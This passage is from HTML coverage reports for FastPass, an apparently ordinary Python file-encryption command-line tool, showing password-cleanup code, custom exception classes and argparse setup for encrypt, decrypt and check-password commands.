    <p class="run"><span class="n"><a id="t274" href="#t274">274</a></span><span class="t">        <span class="key">if</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="str">'password_manager'</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t275" href="#t275">275</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">password_manager</span><span class="op">.</span><span class="nam">clear_passwords</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t276" href="#t276">276</a></span><span class="t">            <span class="key">del</span> <span class="nam">self</span><span class="op">.</span><span class="nam">password_manager</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t277" href="#t277">277</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t278" href="#t278">278</a></span><span class="t">        <span class="com"># Clear CLI arguments containing passwords</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t279" href="#t279">279</a></span><span class="t">        <span class="key">if</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">args</span><span class="op">,</span> <span class="str">'password'</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t280" href="#t280">280</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">args</span><span class="op">.</span><span class="nam">password</span> <span class="op">=</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t281" href="#t281">281</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t282" href="#t282">282</a></span><span class="t">        <span class="com"># Force garbage collection</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t283" href="#t283">283</a></span><span class="t">        <span class="key">import</span> <span class="nam">gc</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t284" href="#t284">284</a></span><span class="t">        <span class="nam">gc</span><span class="op">.</span><span class="nam">collect</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t285" href="#t285">285</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t286" href="#t286">286</a></span><span class="t">    <span class="key">def</span> <span class="nam">_cleanup_partial_processing_on_failure</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t287" href="#t287">287</a></span><span class="t">        <span class="str">"""Cleanup when processing fails partway through"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t288" href="#t288">288</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">_perform_cleanup</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t289" href="#t289">289</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t290" href="#t290">290</a></span><span class="t">    <span class="key">def</span> <span class="nam">_emergency_cleanup</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t291" href="#t291">291</a></span><span class="t">        <span class="str">"""Emergency cleanup for unexpected termination"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t292" href="#t292">292</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t293" href="#t293">293</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">_perform_cleanup</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t294" href="#t294">294</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t295" href="#t295">295</a></span><span class="t">            <span class="key">pass</span>  <span class="com"># Ignore errors during emergency cleanup</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t296" href="#t296">296</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t297" href="#t297">297</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t298" href="#t298">298</a></span><span class="t"><span class="com"># Custom Exception Classes</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t299" href="#t299">299</a></span><span class="t"><span class="key">class</span> <span class="nam">SecurityViolationError</span><span class="op">(</span><span class="nam">Exception</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t300" href="#t300">300</a></span><span class="t">    <span class="str">"""Raised when security validation fails"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t301" href="#t301">301</a></span><span class="t">    <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t302" href="#t302">302</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t303" href="#t303">303</a></span><span class="t"><span class="key">class</span> <span class="nam">FileFormatError</span><span class="op">(</span><span class="nam">Exception</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t304" href="#t304">304</a></span><span class="t">    <span class="str">"""Raised when file format validation fails"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t305" href="#t305">305</a></span><span class="t">    <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t306" href="#t306">306</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t307" href="#t307">307</a></span><span class="t"><span class="key">class</span> <span class="nam">CryptoToolError</span><span class="op">(</span><span class="nam">Exception</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t308" href="#t308">308</a></span><span class="t">    <span class="str">"""Raised when crypto tools are unavailable"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t309" href="#t309">309</a></span><span class="t">    <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t310" href="#t310">310</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t311" href="#t311">311</a></span><span class="t"><span class="key">class</span> <span class="nam">PasswordError</span><span class="op">(</span><span class="nam">Exception</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t312" href="#t312">312</a></span><span class="t">    <span class="str">"""Raised when password operations fail"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t313" href="#t313">313</a></span><span class="t">    <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t314" href="#t314">314</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t315" href="#t315">315</a></span><span class="t"><span class="key">class</span> <span class="nam">ProcessingError</span><span class="op">(</span><span class="nam">Exception</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t316" href="#t316">316</a></span><span class="t">    <span class="str">"""Raised when file processing fails"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t317" href="#t317">317</a></span><span class="t">    <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_145eef247bfb46b6___main___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_145eef247bfb46b6_cli_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_145eef247bfb46b6_cli_py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\cli.py: 81%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\cli.py</b>:
            <span class="pc_cov">81%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">100 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">81<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">19<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_145eef247bfb46b6_app_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_ce21df766c911d41___init___py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass CLI Argument Parsing and Validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">Maps to: Section A - DETAILED CLI PARSING from flowchart</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="com"># A1a: Load System Tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t"><span class="key">import</span> <span class="nam">argparse</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="key">import</span> <span class="nam">sys</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t9" href="#t9">9</a></span><span class="t"><span class="key">import</span> <span class="nam">json</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t10" href="#t10">10</a></span><span class="t"><span class="key">from</span> <span class="nam">pathlib</span> <span class="key">import</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t11" href="#t11">11</a></span><span class="t"><span class="key">from</span> <span class="nam">typing</span> <span class="key">import</span> <span class="nam">List</span><span class="op">,</span> <span class="nam">Optional</span><span class="op">,</span> <span class="nam">Dict</span><span class="op">,</span> <span class="nam">Any</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t12" href="#t12">12</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t13" href="#t13">13</a></span><span class="t"><span class="key">from</span> <span class="nam">utils</span><span class="op">.</span><span class="nam">config</span> <span class="key">import</span> <span class="nam">FastPassConfig</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t14" href="#t14">14</a></span><span class="t"><span class="key">from</span> <span class="nam">utils</span><span class="op">.</span><span class="nam">logger</span> <span class="key">import</span> <span class="nam">setup_logger</span><span class="op">,</span> <span class="nam">sanitize_error_message</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t15" href="#t15">15</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t16" href="#t16">16</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t17" href="#t17">17</a></span><span class="t"><span class="key">def</span> <span class="nam">parse_command_line_arguments</span><span class="op">(</span><span class="op">)</span> <span class="op">-></span> <span class="nam">argparse</span><span class="op">.</span><span class="nam">Namespace</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t18" href="#t18">18</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t19" href="#t19">19</a></span><span class="t"><span class="str">    A1b: Initialize Command Reader</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t20" href="#t20">20</a></span><span class="t"><span class="str">    Create a system to understand user commands</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t21" href="#t21">21</a></span><span class="t"><span class="str">    Set up FastPass name and help description</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t22" href="#t22">22</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t23" href="#t23">23</a></span><span class="t">    <span class="nam">parser</span> <span class="op">=</span> <span class="nam">argparse</span><span class="op">.</span><span class="nam">ArgumentParser</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t24" href="#t24">24</a></span><span class="t">        <span class="nam">prog</span><span class="op">=</span><span class="str">"fast_pass"</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t25" href="#t25">25</a></span><span class="t">        <span class="nam">description</span><span class="op">=</span><span class="str">"FastPass - Universal file encryption and decryption tool"</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t26" href="#t26">26</a></span><span class="t">        <span class="nam">epilog</span><span class="op">=</span><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t27" href="#t27">27</a></span><span class="t"><span class="str">Examples:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t28" href="#t28">28</a></span><span class="t"><span class="str">  fast_pass encrypt -i contract.docx -p "mypassword"</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t29" href="#t29">29</a></span><span class="t"><span class="str">  fast_pass decrypt -i file1.pdf file2.docx -p "shared_pwd"</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t30" href="#t30">30</a></span><span class="t"><span class="str">  fast_pass decrypt -r ./encrypted_docs/ -p "main_password"</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t31" href="#t31">31</a></span><span class="t"><span class="str">        """</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t32" href="#t32">32</a></span><span class="t">        <span class="nam">formatter_class</span><span class="op">=</span><span class="nam">argparse</span><span class="op">.</span><span class="nam">RawDescriptionHelpFormatter</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t33" href="#t33">33</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t34" href="#t34">34</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t35" href="#t35">35</a></span><span class="t">    <span class="com"># A1g: Add Helper Features with Enhanced Logging  </span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t36" href="#t36">36</a></span><span class="t">    <span class="nam">parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t37" href="#t37">37</a></span><span class="t">        <span class="str">'--list-supported'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t38" href="#t38">38</a></span><span class="t">        <span class="nam">action</span><span class="op">=</span><span class="str">'store_true'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t39" href="#t39">39</a></span><span class="t">        <span class="nam">help</span><span class="op">=</span><span class="str">'List supported file formats'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t40" href="#t40">40</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t41" href="#t41">41</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t42" href="#t42">42</a></span><span class="t">    <span class="nam">parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t43" href="#t43">43</a></span><span class="t">        <span class="str">'--version'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t44" href="#t44">44</a></span><span class="t">        <span class="nam">action</span><span class="op">=</span><span class="str">'version'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t45" href="#t45">45</a></span><span class="t">        <span class="nam">version</span><span class="op">=</span><span class="fst">f'</span><span class="fst">FastPass </span><span class="op">{</span><span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">VERSION</span><span class="op">}</span><span class="fst">'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t46" href="#t46">46</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t47" href="#t47">47</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t48" href="#t48">48</a></span><span class="t">    <span class="com"># A1c: Define Main Operation Choice</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t49" href="#t49">49</a></span><span class="t">    <span class="com"># User must choose either encrypt OR decrypt</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t50" href="#t50">50</a></span><span class="t">    <span class="com"># Cannot do both operations simultaneously</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t51" href="#t51">51</a></span><span class="t">    <span class="nam">subparsers</span> <span class="op">=</span> <span class="nam">parser</span><span class="op">.</span><span class="nam">add_subparsers</span><span class="op">(</span><span class="nam">dest</span><span class="op">=</span><span class="str">'operation'</span><span class="op">,</span> <span class="nam">help</span><span class="op">=</span><span class="str">'Operation to perform'</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t52" href="#t52">52</a></span><span class="t">    <span class="nam">subparsers</span><span class="op">.</span><span class="nam">required</span> <span class="op">=</span> <span class="key">False</span>  <span class="com"># Allow for info commands</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t53" href="#t53">53</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t54" href="#t54">54</a></span><span class="t">    <span class="com"># Encrypt operation</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t55" href="#t55">55</a></span><span class="t">    <span class="nam">encrypt_parser</span> <span class="op">=</span> <span class="nam">subparsers</span><span class="op">.</span><span class="nam">add_parser</span><span class="op">(</span><span class="str">'encrypt'</span><span class="op">,</span> <span class="nam">help</span><span class="op">=</span><span class="str">'Add password protection to files'</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t56" href="#t56">56</a></span><span class="t">    <span class="nam">setup_common_arguments</span><span class="op">(</span><span class="nam">encrypt_parser</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t57" href="#t57">57</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t58" href="#t58">58</a></span><span class="t">    <span class="com"># Decrypt operation  </span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t59" href="#t59">59</a></span><span class="t">    <span class="nam">decrypt_parser</span> <span class="op">=</span> <span class="nam">subparsers</span><span class="op">.</span><span class="nam">add_parser</span><span class="op">(</span><span class="str">'decrypt'</span><span class="op">,</span> <span class="nam">help</span><span class="op">=</span><span class="str">'Remove password protection from files'</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t60" href="#t60">60</a></span><span class="t">    <span class="nam">setup_common_arguments</span><span class="op">(</span><span class="nam">decrypt_parser</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t61" href="#t61">61</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t62" href="#t62">62</a></span><span class="t">    <span class="com"># Add recursive option to decrypt and check-password only</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t63" href="#t63">63</a></span><span class="t">    <span class="nam">decrypt_parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t64" href="#t64">64</a></span><span class="t">        <span class="str">'-r'</span><span class="op">,</span> <span class="str">'--recursive'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t65" href="#t65">65</a></span><span class="t">        <span class="nam">type</span><span class="op">=</span><span class="nam">Path</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t66" href="#t66">66</a></span><span class="t">        <span class="nam">help</span><span class="op">=</span><span class="str">'Process directory recursively (decrypt/check-password only)'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t67" href="#t67">67</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t68" href="#t68">68</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t69" href="#t69">69</a></span><span class="t">    <span class="com"># Check password operation</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t70" href="#t70">70</a></span><span class="t">    <span class="nam">check_parser</span> <span class="op">=</span> <span class="nam">subparsers</span><span class="op">.</span><span class="nam">add_parser</span><span class="op">(</span><span class="str">'check-password'</span><span class="op">,</span> <span class="nam">help</span><span class="op">=</span><span class="str">'Check if files require passwords'</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t71" href="#t71">71</a></span><span class="t">    <span class="nam">setup_common_arguments</span><span class="op">(</span><span class="nam">check_parser</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t72" href="#t72">72</a></span><span class="t">    <span class="nam">check_parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t73" href="#t73">73</a></span><span class="t">        <span class="str">'-r'</span><span class="op">,</span> <span class="str">'--recursive'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t74" href="#t74">74</a></span><span class="t">        <span class="nam">type</span><span class="op">=</span><span class="nam">Path</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t75" href="#t75">75</a></span><span class="t">        <span class="nam">help</span><span class="op">=</span><span class="str">'Process directory recursively'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t76" href="#t76">76</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t77" href="#t77">77</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t78" href="#t78">78</a></span><span class="t">    <span class="com"># Note: encrypt parser deliberately does not have -r option for security</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t79" href="#t79">79</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t80" href="#t80">80</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t81" href="#t81">81</a></span><span class="t">    <span class="key">return</span> <span class="nam">parser</span><span class="op">.</span><span class="nam">parse_args</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t82" href="#t82">82</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t83" href="#t83">83</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t84" href="#t84">84</a></span><span class="t"><span class="key">def</span> <span class="nam">setup_common_arguments</span><span class="op">(</span><span class="nam">parser</span><span class="op">:</span> <span class="nam">argparse</span><span class="op">.</span><span class="nam">ArgumentParser</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t85" href="#t85">85</a></span><span class="t">    <span class="str">"""Setup arguments common to all operations"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t86" href="#t86">86</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t87" href="#t87">87</a></span><span class="t">    <span class="com"># A1d: Set Up File Input Options</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t88" href="#t88">88</a></span><span class="t">    <span class="com"># Use -i/--input flag for space-delimited files</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t89" href="#t89">89</a></span><span class="t">    <span class="com"># Require explicit file specification with quotes for spaced paths</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t90" href="#t90">90</a></span><span class="t">    <span class="nam">parser</span><span class="op">.</span><span class="nam">add_argument</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t91" href="#t91">91</a></span><span class="t">        <span class="str">'-i'</span><span class="op">,</span> <span class="str">'--input'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t92" href="#t92">92</a></span><span class="t">        <span class="nam">nargs</span><span class="op">=</span><span class="str">'+'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t93" href="#t93">93</a></span><span class="t">        <span class="nam">type</span><span class="op">=</span><span class="nam">Path</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t94" href="#t94">94</a></span><span class="t">        <span class="nam">help</span><span class="op">=</span><span class="str">'Files to process (space-delimited, quotes for spaces)'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t95" href="#t95">95</a></span><span class="t">    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t96" href="#t96">96</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t97" href="#t97">97</a></span><span class="t">    <span class="com"># A1e: Configure Password Options with Space Delimitation</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t98" href="#t98">98</a></span><span class="t">    <span class="com"># Accept space-delimited passwords with -p flag</span>&nbsp;</span><span class="r"></span></p>
